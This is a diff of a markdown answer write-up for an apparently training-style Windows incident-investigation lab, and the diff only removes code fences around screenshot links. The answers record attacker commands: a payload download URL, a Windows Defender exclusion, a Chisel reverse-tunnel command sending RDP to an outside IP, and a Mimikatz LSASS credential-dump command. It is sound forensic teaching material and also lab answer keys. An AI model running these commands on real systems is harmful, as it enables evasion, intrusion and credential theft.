@@ -31,10 +31,8 @@ Common Event IDs:
 
 **Answer:** `1102`
 
-**Screenshot**
-```md
 ![Q1](screenshots/task2-q1.png)
-```
+
 
 # Task 3 – Initial Access | Web Access Logs
 
@@ -45,26 +43,20 @@ Common Event IDs:
 ### Q1. What is the title of the HR01-SRV web app hosted on port 80?
 **Answer:** `Salary Raise Approver v0.1`
 
-**Screenshot**
-```md
 ![Q1](screenshots/task3-q1.png)
-```
+
 
 ### Q2. Which IP performed an extensive web scan on the HR01-SRV web app?
 **Answer:** `10.10.23.190`
 
-**Screenshot**
-```md
 ![Q2](screenshots/task3-q2.png)
-```
+
 
 ### Q3.What is the absolute path to the file that the suspicious IP uploaded?
 **Answer:** `C:\Apache24\htdocs\uploads\search.php`
 
-**Screenshot**
-```md
 ![Q3](screenshots/task3-q3.png)
-```
+
 
 ### Q4.Clearly, that's suspicious! What would you call the uploaded malware / backdoor?
 **Answer:** `Web Shell`
@@ -86,16 +78,14 @@ Common Event IDs:
 ### Q1. What was the first command entered by the attacker?
 `whoami`
 
-```md
 ![Q1](screenshots/task4-q1.png)
-```
+
 
 ### Q2. What is the full URL of the file that the attacker attempted to download?
 `http://10.10.23.190:8080/httpd-proxy.exe`
 
-```md
 ![Q2](screenshots/task4-q2.png)
-```
+
 
 ### Q3. What command was run to exclude the file from Windows Defender?
 ```powershell
@@ -105,9 +95,8 @@ Add-MpPreference -ExclusionPath C:\Apache24
 ### Q4. Which remote access service was tunnelled using the uploaded binary?
 `RDP`
 
-```md
 ![Q4](screenshots/task4-q4.png)
-```
+
 
 **Learning Outcomes**
 - PowerShell forensics
@@ -127,30 +116,26 @@ Important Event IDs:
 ### Q1. What is the timestamp of the first suspicious RDP login?
 `2025-01-23 17:00:12`
 
-```md
 ![Q1](screenshots/task5.png)
-```
+
 
 ### Q2. What user did the attacker breach?
 `HR01-SRV\Administrator`
 
-```md
 ![Q2](screenshots/task5.png)
-```
+
 
 ### Q3. What IP is shown as the source of the RDP login?
 `10.10.23.190`
 
-```md
 ![Q3](screenshots/task5.png)
-```
+
 
 ### Q4. What is the timestamp when the attacker disconnected from RDP?
 `2025-01-23 17:16:46`
 
-```md
 ![Q4](screenshots/task5-q4.png)
-```
+
 
 ---
 
@@ -165,30 +150,26 @@ Event IDs:
 ### Q1. What is the name of the suspicious scheduled task?
 `Apache Proxy`
 
-```md
 ![Q1](screenshots/task6-q12.png)
-```
+
 
 ### Q2. When was the suspicious scheduled task created?
 `2025-01-23 17:05:37`
 
-```md
 ![Q2](screenshots/task6-q12.png)
-```
+
 
 ### Q3. What is the task's "Trigger" value as shown in Task Scheduler GUI?
 `At system startup`
 
-```md
 ![Q3](screenshots/task6-q3.png)
-```
+
 
 ### Q4. What is the full command line of the malicious task?
 `C:\Apache24\bin\httpd-proxy.exe client 10.10.23.190:10443 R:3389:127.0.0.1:3389`
 
-```md
 ![Q4](screenshots/task6-q4.png)
-```
+
 
 ---
 
@@ -203,16 +184,14 @@ Important IDs:
 ### Q1. What is the threat family ("Name") of the first quarantined file? 
 `VirTool:Win64/Chisel.G`
 
-```md
 ![Q1](screenshots/task7-q1.png)
-```
+
 
 ### Q2. And what is the threat family of the next detected malware?
 `HackTool:Win32/Mimikatz!pz`
 
-```md
 ![Q2](screenshots/task7-q2.png)
-```
+
 
 ### Q3. What is the file name of the downloaded Mimikatz executable?
 `mimi.exe`
@@ -221,9 +200,8 @@ Important IDs:
 ### Q4. Finally, which Mimikatz command was used to extract hashes from LSASS memory?
 `lsadump::lsa /inject`
 
-```md
 ![Q4](screenshots/task7-q4.png)
-```
+
 
 # Attack Timeline
 
